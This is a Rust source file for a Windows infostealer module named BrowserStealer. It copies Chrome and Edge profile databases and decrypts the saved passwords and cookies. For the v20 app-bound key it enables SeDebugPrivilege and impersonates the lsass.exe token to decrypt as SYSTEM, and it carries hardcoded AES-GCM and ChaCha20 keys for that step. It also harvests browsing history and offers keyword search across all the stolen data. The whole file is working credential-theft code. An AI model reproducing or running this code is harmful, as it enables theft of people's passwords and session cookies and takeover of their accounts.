pub struct BrowserStealer;

impl BrowserStealer {
    pub fn collect(browser_type: &str, offset: usize, limit: usize) -> String {
        #[cfg(target_os = "windows")]
        {
            Self::collect_windows(browser_type, offset, limit)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = (browser_type, offset, limit);
            r#"{"total":0,"offset":0,"limit":0,"items":[]}"#.to_string()
        }
    }

    pub fn search(browser_type: &str, keyword: &str) -> String {
        #[cfg(target_os = "windows")]
        {
            Self::search_windows(browser_type, keyword)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = (browser_type, keyword);
            r#"{"total":0,"items":[]}"#.to_string()
        }
    }

    #[cfg(target_os = "windows")]
    fn search_windows(browser_type: &str, keyword: &str) -> String {
        let local_appdata = dirs_local_appdata();
        let keyword_lower = keyword.to_lowercase();

        let browsers: &[(&str, &str)] = match browser_type {
            "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
            "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
            _ => &[
                ("Chrome", r"Google\Chrome\User Data"),
                ("Edge", r"Microsoft\Edge\User Data"),
            ],
        };

        let mut matched = Vec::new();

        for (name, rel_path) in browsers {
            let user_data = format!(r"{}\{}", local_appdata, rel_path);
            let p = std::path::Path::new(&user_data);
            if !p.exists() { continue; }

            let ls_path = p.join("Local State");
            let v10_key = extract_v10_key(&ls_path);
            let v20_key = extract_v20_key(&ls_path);

            let default = p.join("Default");

            // Search passwords
            let login_db = default.join("Login Data");
            if login_db.exists() {
                let tmp = copy_to_temp(&login_db);
                if let Some(ref tmp_path) = tmp {
                    search_logins(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // Search cookies
            let cookie_db = default.join("Network").join("Cookies");
            let cookie_db2 = default.join("Cookies");
            let cookie_path = if cookie_db.exists() { &cookie_db } else { &cookie_db2 };
            if cookie_path.exists() {
                let tmp = copy_to_temp(cookie_path);
                if let Some(ref tmp_path) = tmp {
                    search_cookies(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // Search history
            let hist_db = default.join("History");
            if hist_db.exists() {
                let tmp = copy_to_temp(&hist_db);
                if let Some(ref tmp_path) = tmp {
                    search_history(name, tmp_path, &keyword_lower, &mut matched);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }
        }

        let total = matched.len();
        format!(
            r#"{{"total":{},"items":[{}]}}"#,
            total,
            matched.join(",")
        )
    }

    #[cfg(target_os = "windows")]
    fn collect_windows(browser_type: &str, offset: usize, limit: usize) -> String {
        let local_appdata = dirs_local_appdata();

        let browsers: &[(&str, &str)] = match browser_type {
            "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
            "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
            _ => &[
                ("Chrome", r"Google\Chrome\User Data"),
                ("Edge", r"Microsoft\Edge\User Data"),
            ],
        };

        let mut all_items = Vec::new();

        for (name, rel_path) in browsers {
            let user_data = format!(r"{}\{}", local_appdata, rel_path);
            let p = std::path::Path::new(&user_data);
            if !p.exists() {
                continue;
            }

            let ls_path = p.join("Local State");
            let v10_key = extract_v10_key(&ls_path);
            let v20_key = extract_v20_key(&ls_path);

            let default = p.join("Default");

            // Passwords
            let login_db = default.join("Login Data");
            if login_db.exists() {
                let tmp = copy_to_temp(&login_db);
                if let Some(ref tmp_path) = tmp {
                    read_logins(name, tmp_path, &v10_key, &v20_key, &mut all_items);
                    let _ = std::fs::remove_file(tmp_path);
                    // Clean WAL/SHM
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // Cookies
            let cookie_db = default.join("Network").join("Cookies");
            let cookie_db2 = default.join("Cookies");
            let cookie_path = if cookie_db.exists() { &cookie_db } else { &cookie_db2 };
            if cookie_path.exists() {
                let tmp = copy_to_temp(cookie_path);
                if let Some(ref tmp_path) = tmp {
                    read_cookies(name, tmp_path, &v10_key, &v20_key, &mut all_items);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // History
            let hist_db = default.join("History");
            if hist_db.exists() {
                let tmp = copy_to_temp(&hist_db);
                if let Some(ref tmp_path) = tmp {
                    read_history(name, tmp_path, &mut all_items);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }
        }

        let total = all_items.len();
        let items: Vec<_> = all_items.into_iter().skip(offset).take(if limit == 0 { 100 } else { limit }).collect();
        format!(
            r#"{{"total":{},"offset":{},"limit":{},"items":[{}]}}"#,
            total,
            offset,
            limit,
            items.join(",")
        )
    }
}

// ── Search helpers ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn search_logins(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, keyword: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let user: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((url, user, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, user, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let pass = key.and_then(|k| decrypt_aes_gcm(&enc, k, false));
            let displayed = pass.unwrap_or_default();

            // Match keyword against url, username, password
            let haystack = format!("{} {} {}", url, user, displayed).to_lowercase();
            if !haystack.contains(keyword) { continue; }

            items.push(format!(
                r#"{{"browser":"{}","type":"password","url":"{}","username":"{}","password":"{}","version":"{}"}}"#,
                escape(name),
                escape(&url),
                escape(&user),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
fn search_cookies(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, keyword: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let cname: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((host, cname, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (host, cname, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let val = key.and_then(|k| decrypt_aes_gcm(&enc, k, true));
            let displayed = val.unwrap_or_default();

            // Match keyword against host, name, value
            let haystack = format!("{} {} {}", host, cname, displayed).to_lowercase();
            if !haystack.contains(keyword) { continue; }

            items.push(format!(
                r#"{{"browser":"{}","type":"cookie","host":"{}","name":"{}","value":"{}","version":"{}"}}"#,
                escape(name),
                escape(&host),
                escape(&cname),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
fn search_history(name: &str, db_path: &str, keyword: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5000") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visits: i32 = row.get(2)?;
        Ok((url, title, visits))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, title, visits) = row;

            // Match keyword against url, title
            let haystack = format!("{} {}", url, title).to_lowercase();
            if !haystack.contains(keyword) { continue; }

            items.push(format!(
                r#"{{"browser":"{}","type":"history","url":"{}","title":"{}","visits":{}}}"#,
                escape(name),
                escape(&url),
                escape(&title),
                visits
            ));
        }
    });
}

// ── v10 DPAPI Key ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn extract_v10_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
    let json = std::fs::read_to_string(ls_path).ok()?;
    let doc: serde_json::Value = serde_json::from_str(&json).ok()?;
    let ek = doc.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let raw = base64_decode(ek)?;
    if raw.len() < 5 || &raw[..5] != b"DPAPI" {
        return None;
    }
    dpapi_unprotect(&raw[5..])
}

// ── v20 App-Bound Key ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn extract_v20_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
    let json = std::fs::read_to_string(ls_path).ok()?;
    let doc: serde_json::Value = serde_json::from_str(&json).ok()?;
    let ak = doc.get("os_crypt")?.get("app_bound_encrypted_key")?.as_str()?;
    get_app_bound_master_key(ak)
}

#[cfg(target_os = "windows")]
fn get_app_bound_master_key(base64: &str) -> Option<Vec<u8>> {
    let raw = base64_decode(base64)?;
    if raw.len() < 5 || &raw[..4] != b"APPB" {
        return None;
    }
    let sys_dec = dpapi_decrypt_as_system(&raw[4..])?;
    let user_dec = dpapi_unprotect(&sys_dec)?;
    parse_key_blob(&user_dec)
}

// ── Key Blob Parsing ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn parse_key_blob(blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 8 {
        return None;
    }
    let hdr_len = i32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]) as usize;
    let off = 4 + hdr_len;
    if off + 4 > blob.len() {
        return None;
    }
    let content_len = i32::from_le_bytes([blob[off], blob[off+1], blob[off+2], blob[off+3]]) as usize;
    let data_start = off + 4;
    if data_start + content_len > blob.len() {
        return None;
    }
    let c = &blob[data_start..data_start + content_len];

    if c.len() == 32 {
        return Some(c.to_vec());
    }
    if c.len() < 61 {
        return None;
    }

    let flag = c[0];
    let iv = &c[1..13];
    let tag = &c[c.len() - 16..];
    let ct = &c[13..c.len() - 16];

    match flag {
        1 => aes_gcm_decrypt_raw(AES_GCM_FLAG1_KEY, iv, ct, tag),
        2 => chacha20_decrypt_raw(CHACHA20_KEY, iv, ct, tag),
        _ => None,
    }
}

const AES_GCM_FLAG1_KEY: &[u8] = &[
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87,
];

const CHACHA20_KEY: &[u8] = &[
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60,
];

// ── DPAPI ──────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    let blob_in = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut blob_out = DATA_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
    unsafe {
        let ok = CryptUnprotectData(
            &blob_in, std::ptr::null(), std::ptr::null(),
            std::ptr::null(), std::ptr::null(), 0, &mut blob_out,
        );
        if ok == 0 || blob_out.pbData.is_null() {
            return None;
        }
        let result = std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
        LocalFree(blob_out.pbData);
        Some(result)
    }
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt_as_system(data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let procs = find_lsass_pid()?;

        enable_debug_privilege()?;

        let h_proc = OpenProcess(0x1000, 0, procs); // PROCESS_QUERY_LIMITED_INFORMATION
        if h_proc == 0 {
            return None;
        }

        let result = (|| {
            let mut h_token: isize = 0;
            if OpenProcessToken(h_proc, 0x0002 | 0x0008, &mut h_token) == 0 {
                return None;
            } // TOKEN_DUPLICATE | TOKEN_QUERY

            let mut lsass_token: isize = 0;
            if DuplicateTokenEx(h_token, 0x000F01FF, std::ptr::null(), 2, 1, &mut lsass_token) == 0 {
                CloseHandle(h_token);
                return None;
            }
            CloseHandle(h_token);

            if ImpersonateLoggedOnUser(lsass_token) == 0 {
                CloseHandle(lsass_token);
                return None;
            }

            let out = dpapi_unprotect(data);
            RevertToSelf();
            CloseHandle(lsass_token);
            out
        })();

        CloseHandle(h_proc);
        result
    }
}

#[cfg(target_os = "windows")]
unsafe fn find_lsass_pid() -> Option<u32> {
    // Use CreateToolhelp32Snapshot to enumerate processes
    let snapshot = CreateToolhelp32Snapshot(0x00000002, 0); // TH32CS_SNAPPROCESS
    if snapshot == -1 {
        return None;
    }

    let mut pe = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..std::mem::zeroed()
    };

    if Process32FirstW(snapshot, &mut pe) != 0 {
        loop {
            let name = String::from_utf16_lossy(
                &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe.szExeFile.len())]
            );
            if name.eq_ignore_ascii_case("lsass.exe") {
                CloseHandle(snapshot);
                return Some(pe.th32ProcessID);
            }
            if Process32NextW(snapshot, &mut pe) == 0 {
                break;
            }
        }
    }
    CloseHandle(snapshot);
    None
}

#[cfg(target_os = "windows")]
unsafe fn enable_debug_privilege() -> Option<()> {
    let mut h_token: isize = 0;
    if OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, &mut h_token) == 0 {
        return None;
    }

    let mut luid: i64 = 0;
    let name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
    if LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
        CloseHandle(h_token);
        return None;
    }

    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Luid: luid,
        Attributes: 0x00000002, // SE_PRIVILEGE_ENABLED
    };

    AdjustTokenPrivileges(h_token, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut());
    CloseHandle(h_token);
    Some(())
}

// ── SQLite Readers ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn read_logins(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let user: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((url, user, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, user, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let pass = key.and_then(|k| decrypt_aes_gcm(&enc, k, false));

            // Skip entries where password is empty
            let displayed = pass.unwrap_or_default();
            if displayed.is_empty() {
                continue;
            }

            items.push(format!(
                r#"{{"browser":"{}","type":"password","url":"{}","username":"{}","password":"{}","version":"{}"}}"#,
                escape(name),
                escape(&url),
                escape(&user),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
fn read_cookies(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let cname: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((host, cname, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (host, cname, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let val = key.and_then(|k| decrypt_aes_gcm(&enc, k, true));

            // Skip entries where cookie value is empty
            let displayed = val.unwrap_or_default();
            if displayed.is_empty() {
                continue;
            }

            items.push(format!(
                r#"{{"browser":"{}","type":"cookie","host":"{}","name":"{}","value":"{}","version":"{}"}}"#,
                escape(name),
                escape(&host),
                escape(&cname),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
fn read_history(name: &str, db_path: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visits: i32 = row.get(2)?;
        Ok((url, title, visits))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, title, visits) = row;

            // Skip entries where url is empty
            if url.is_empty() {
                continue;
            }

            items.push(format!(
                r#"{{"browser":"{}","type":"history","url":"{}","title":"{}","visits":{}}}"#,
                escape(name),
                escape(&url),
                escape(&title),
                visits
            ));
        }
    });
}

// ── AES-GCM Decryption ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn decrypt_aes_gcm(encrypted: &[u8], key: &[u8], is_cookie: bool) -> Option<String> {
    use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::Aead};

    let nonce = Nonce::from_slice(&encrypted[3..15]);
    let tag_start = encrypted.len() - 16;
    let ct = &encrypted[15..tag_start];
    let tag = &encrypted[tag_start..];

    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    let plaintext = cipher.decrypt(nonce, combined.as_slice()).ok()?;

    if is_cookie && plaintext.len() > 32 {
        Some(String::from_utf8_lossy(&plaintext[32..]).to_string())
    } else {
        Some(String::from_utf8_lossy(&plaintext).to_string())
    }
}

#[cfg(target_os = "windows")]
fn aes_gcm_decrypt_raw(key: &[u8], iv: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::Aead};

    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(iv);
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    cipher.decrypt(nonce, combined.as_slice()).ok()
}

#[cfg(target_os = "windows")]
fn chacha20_decrypt_raw(key: &[u8], iv: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    use chacha20poly1305::{ChaCha20Poly1305, Nonce, KeyInit, aead::Aead};

    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(iv);
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    cipher.decrypt(nonce, combined.as_slice()).ok()
}

// ── Windows FFI ────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
#[repr(C)]
struct DATA_BLOB {
    cbData: u32,
    pbData: *mut u8,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct TOKEN_PRIVILEGES {
    PrivilegeCount: u32,
    Luid: i64,
    Attributes: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct PROCESSENTRY32W {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [u16; 260],
}

#[cfg(target_os = "windows")]
extern "system" {
    // crypt32
    fn CryptUnprotectData(
        pDataIn: *const DATA_BLOB,
        ppszDataDescr: *const u16,
        pOptionalEntropy: *const DATA_BLOB,
        pvReserved: *const std::ffi::c_void,
        pPromptStruct: *const std::ffi::c_void,
        dwFlags: u32,
        pDataOut: *mut DATA_BLOB,
    ) -> i32;

    // kernel32
    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
    fn CloseHandle(hObject: isize) -> i32;
    fn LocalFree(hMem: *mut u8) -> isize;
    fn GetCurrentProcess() -> isize;
    fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> isize;
    fn Process32FirstW(hSnapshot: isize, lppe: *mut PROCESSENTRY32W) -> i32;
    fn Process32NextW(hSnapshot: isize, lppe: *mut PROCESSENTRY32W) -> i32;

    // advapi32
    fn OpenProcessToken(ProcessHandle: isize, DesiredAccess: u32, TokenHandle: *mut isize) -> i32;
    fn DuplicateTokenEx(
        hExistingToken: isize,
        dwDesiredAccess: u32,
        lpTokenAttributes: *const std::ffi::c_void,
        ImpersonationLevel: i32,
        TokenType: i32,
        phNewToken: *mut isize,
    ) -> i32;
    fn ImpersonateLoggedOnUser(hToken: isize) -> i32;
    fn RevertToSelf() -> i32;
    fn LookupPrivilegeValueW(lpSystemName: *const u16, lpName: *const u16, lpLuid: *mut i64) -> i32;
    fn AdjustTokenPrivileges(
        TokenHandle: isize,
        DisableAllPrivileges: i32,
        NewState: *const TOKEN_PRIVILEGES,
        BufferLength: u32,
        PreviousState: *mut TOKEN_PRIVILEGES,
        ReturnLength: *mut u32,
    ) -> i32;
}

// ── Helpers ────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn dirs_local_appdata() -> String {
    std::env::var("LOCALAPPDATA").unwrap_or_else(|_| {
        let home = std::env::var("USERPROFILE").unwrap_or_default();
        format!(r"{}\AppData\Local", home)
    })
}

#[cfg(target_os = "windows")]
fn base64_decode(s: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(s).ok()
}

#[cfg(target_os = "windows")]
fn copy_to_temp(path: &std::path::Path) -> Option<String> {
    use std::io::{Read, Write};
    let tmp_name = format!("{}\\bd_{}.db", std::env::temp_dir().to_string_lossy(), uuid::Uuid::new_v4().simple());
    let mut src = std::fs::File::open(path).ok()?;
    let mut buf = Vec::new();
    src.read_to_end(&mut buf).ok()?;
    let mut dst = std::fs::File::create(&tmp_name).ok()?;
    dst.write_all(&buf).ok()?;

    // Copy WAL/SHM if present
    for ext in &["-wal", "-shm"] {
        let wal_path = format!("{}{}", path.to_string_lossy(), ext);
        if std::path::Path::new(&wal_path).exists() {
            let _ = std::fs::copy(&wal_path, format!("{}{}", tmp_name, ext));
        }
    }
    Some(tmp_name)
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}
